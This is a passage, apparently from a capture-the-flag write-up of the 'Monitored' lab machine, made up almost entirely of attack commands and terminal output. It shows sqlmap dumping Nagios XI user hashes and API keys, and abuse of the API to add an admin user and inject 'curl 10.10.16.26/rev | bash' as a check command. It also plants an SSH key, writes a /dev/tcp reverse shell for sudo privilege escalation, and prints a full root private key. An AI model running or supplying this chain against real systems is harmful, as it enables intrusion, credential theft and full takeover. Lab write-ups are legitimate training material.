[22:51:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[22:51:09] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[22:51:09] [INFO] fetching current database
[22:51:10] [INFO] retrieved: 'nagiosxi'
[22:51:10] [INFO] fetching columns for table 'xi_users' in database 'nagiosxi'
[22:51:11] [INFO] retrieved: 'user_id'
[22:51:11] [INFO] retrieved: 'int(11)'
[22:51:12] [INFO] retrieved: 'username'
[22:51:12] [INFO] retrieved: 'varchar(255)'
[22:51:13] [INFO] retrieved: 'password'
[22:51:13] [INFO] retrieved: 'varchar(128)'
[22:51:13] [INFO] retrieved: 'name'
[22:51:14] [INFO] retrieved: 'varchar(100)'
[22:51:14] [INFO] retrieved: 'email'
[22:51:15] [INFO] retrieved: 'varchar(128)'
[22:51:15] [INFO] retrieved: 'backend_ticket'
[22:51:16] [INFO] retrieved: 'varchar(128)'
[22:51:16] [INFO] retrieved: 'enabled'
[22:51:17] [INFO] retrieved: 'smallint(6)'
[22:51:17] [INFO] retrieved: 'api_key'
[22:51:17] [INFO] retrieved: 'varchar(128)'
[22:51:18] [INFO] retrieved: 'api_enabled'
[22:51:18] [INFO] retrieved: 'smallint(6)'
[22:51:19] [INFO] retrieved: 'login_attempts'
[22:51:19] [INFO] retrieved: 'smallint(6)'
[22:51:19] [INFO] retrieved: 'last_attempt'
[22:51:20] [INFO] retrieved: 'int(11)'
[22:51:20] [INFO] retrieved: 'last_password_change'
[22:51:21] [INFO] retrieved: 'int(11)'
[22:51:21] [INFO] retrieved: 'last_login'
[22:51:22] [INFO] retrieved: 'int(11)'
[22:51:22] [INFO] retrieved: 'last_edited'
[22:51:22] [INFO] retrieved: 'int(11)'
[22:51:23] [INFO] retrieved: 'last_edited_by'
[22:51:23] [INFO] retrieved: 'int(11)'
[22:51:24] [INFO] retrieved: 'created_by'
[22:51:24] [INFO] retrieved: 'int(11)'
[22:51:25] [INFO] retrieved: 'created_time'
[22:51:25] [INFO] retrieved: 'int(11)'
[22:51:25] [INFO] fetching entries for table 'xi_users' in database 'nagiosxi'
[22:51:26] [INFO] retrieved: 'Nagios Administrator'
[22:51:27] [INFO] retrieved: '1'
[22:51:27] [INFO] retrieved: 'IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL'
[22:51:28] [INFO] retrieved: 'IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0'
[22:51:28] [INFO] retrieved: '0'
[22:51:29] [INFO] retrieved: '0'
[22:51:29] [INFO] retrieved: 'admin@monitored.htb'
[22:51:30] [INFO] retrieved: '1'
[22:51:30] [INFO] retrieved: '1705178990'
[22:51:31] [INFO] retrieved: '1701427555'
[22:51:31] [INFO] retrieved: '5'
[22:51:32] [INFO] retrieved: '1701931372'
[22:51:32] [INFO] retrieved: '1701427555'
[22:51:32] [INFO] retrieved: '3'
[22:51:33] [INFO] retrieved: '$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C'
[22:51:34] [INFO] retrieved: '1'
[22:51:34] [INFO] retrieved: 'nagiosadmin'
[22:51:34] [INFO] retrieved: 'svc'
[22:51:35] [INFO] retrieved: '1'
[22:51:36] [INFO] retrieved: '2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK'
[22:51:37] [INFO] retrieved: '6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq'
[22:51:37] [INFO] retrieved: '1'
[22:51:38] [INFO] retrieved: '1699634403'
[22:51:38] [INFO] retrieved: 'svc@monitored.htb'
[22:51:38] [INFO] retrieved: '0'
[22:51:39] [INFO] retrieved: '1705180895'
[22:51:39] [INFO] retrieved: '1699728200'
[22:51:40] [INFO] retrieved: '1'
[22:51:40] [INFO] retrieved: '1699724476'
[22:51:41] [INFO] retrieved: '1699697433'
[22:51:41] [INFO] retrieved: '9'
[22:51:42] [INFO] retrieved: '$2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK'
[22:51:43] [INFO] retrieved: '2'
[22:51:43] [INFO] retrieved: 'svc'
Database: nagiosxi
Table: xi_users
[2 entries]
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 1705178990   | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 3              | 1701427555           |
| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1705180895   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 9              | 1699697433           |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+

[22:51:43] [INFO] table 'nagiosxi.xi_users' dumped to CSV file '/home/user/.local/share/sqlmap/output/nagios.monitored.htb/dump/nagiosxi/xi_users.csv'
[22:51:43] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/nagios.monitored.htb'

[*] ending @ 22:51:43 /2024-01-13/
```

| API Key |
| --- |
| IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL |

```c
┌──(user㉿kali)-[~]
└─$ curl -X POST "http://monitored.htb/nagiosxi/api/v1/system/user" \
     -d "apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" \
     -d "pretty=1" \
     -d "username=Foobar" \
     -d "password=Foobar2000" \
     -d "name=FOOBAR" \
     -d "email=foobar@foobar.local" \
     -d "auth_level=admin"
{"success":"User account foobar was added successfully!","user_id":7}
```

```c
┌──(user㉿kali)-[~]
└─$ curl -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/config/command?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "command_name=check_touch_tmp&command_line=touch /tmp/testing&applyconfig=1" -k
{
    "success": "Added check_touch_tmp to the system. Config applied, Nagios Core was restarted."
}
```

```c
┌──(user㉿kali)-[~]
└─$ curl -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/config/command?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "command_name=check_among_2&command_line=curl 10.10.16.26/rev | bash&applyconfig=1" -k
{
    "success": "Added check_among_2 to the system. Config applied, Nagios Core was restarted."
}
```

We modified the `ping check` and added `check_among_2` to the check, saved and forced it.

> https://nagios.monitored.htb/nagiosxi/index.php

```c
Service Status -> PING -> Configure -> Re-configure this service -> Monitoring -> Monitor the service with this command: (Advanced users only)
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.26] from (UNKNOWN) [10.129.15.95] 58188
bash: cannot set terminal process group (17654): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:/tmp$
```

```c
nagios@monitored:/tmp$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDAiZ0BuXmspO/KEZqHsGB6jfgR9MxK9uRqSInr+uEitc/Qgg6UjMx7acdim1oMazprDLSHnYGf/SCA8C2/G6sEwTmMzRVlLc0BY4nOa01oi7j1AUDZPu1O8tbPLZSTaxaTPeKLlVjmp6isdiwvFcIvcvfo9TvKUK4S5QXnIPAdEv/B+glmiOsZS8QZiPpkSlhvoW1zXkfSemwDrhyiFt44UgV92ji3du52yck1AJ6/XIBs/jODUod/wZdjsxLTSv4AhyplLQno68rNU7+fXduO6jnaJQ9ijz8B9KHSdzvn67NWiqZoJoUKJvUnuHtjP5IiXlvfu+VkhtKnR1tEiJUD5iCvfodvAvWmO4QTUgVX8YNY4wWJCs4Pwxg8N64bdsGxdkK4FwcBSMt/K1nkGxUXDEtX1pZpd1UFJJmxycVJCRu9cdr/tBl89/Bx3iYlfaPdr8cgZO5kC8I/r9KPI/hkPQk19JLg4+A/w4hysGGyHM4NZRUVmRHzlJMfdkXKjywHHMAEhthmPmAU84LLbl74BlRoj4cY245QviCIx9JbPtREbn/y1QIbPkExzqaOZbt9W4X8vuFybj5qqHb0P8DXGon91ISIhyuGB52B3XW6IoogYtYdS4HvCJmPjitfPwHWkNTqdZzOfMIAfYIuwwZkxp6Ha8S2xNrpf0hHYM5syQ==' >> /home/nagios/.ssh/authorized_keys
<pf0hHYM5syQ==' >> /home/nagios/.ssh/authorized_keys
nagios@monitored:/tmp$
```

```c
┌──(user㉿kali)-[~]
└─$ ssh nagios@monitored.htb
Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
nagios@monitored:~$
```

## user.txt

```c
nagios@monitored:~$ cat user.txt 
9270a800652614671bee51eabca62d08
```

## Enumeration

```c
nagios@monitored:~$ id
uid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)
```

```c
nagios@monitored:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
avahi-autoipd:x:105:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
svc:x:1000:1000:svc,,,:/home/svc:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
ntp:x:108:116::/nonexistent:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
Debian-exim:x:110:118::/var/spool/exim4:/usr/sbin/nologin
uuidd:x:111:119::/run/uuidd:/usr/sbin/nologin
openldap:x:112:120:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
Debian-snmp:x:113:121::/var/lib/snmp:/bin/false
snmptt:x:114:122:SNMP Trap Translator,,,:/var/spool/snmptt:/usr/sbin/nologin
shellinabox:x:115:123:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin
nagios:x:1001:1001::/home/nagios:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

```c
nagios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

```c
nagios@monitored:/usr/local/nagios/bin$ ls -la
total 2196
drwxr-xr-x 2 nagios nagios    4096 Jan 13 19:33 .
drwxr-xr-x 8 root   root      4096 Nov  9 10:40 ..
-rwxr-xr-x 1 nagios nagios      64 Jan 13 19:33 nagios
-rwxrwxr-- 1 nagios nagios  717648 Nov  9 10:40 nagios.bak
```

```c
nagios@monitored:/usr/local/nagios/bin$ cat nagios
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.26/1234 0>&1'
```

```c
nagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.16.26] from (UNKNOWN) [10.129.15.95] 41010
bash: cannot set terminal process group (49266): Inappropriate ioctl for device
bash: no job control in this shell
root@monitored:/#
```

## root.txt

```c
root@monitored:/root# cat root.txt
cat root.txt
7ffce465e7501e80e1c8e713fc348a95
```

## Post Exploitation Cleanup

```c
root@monitored:/root/.ssh# cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
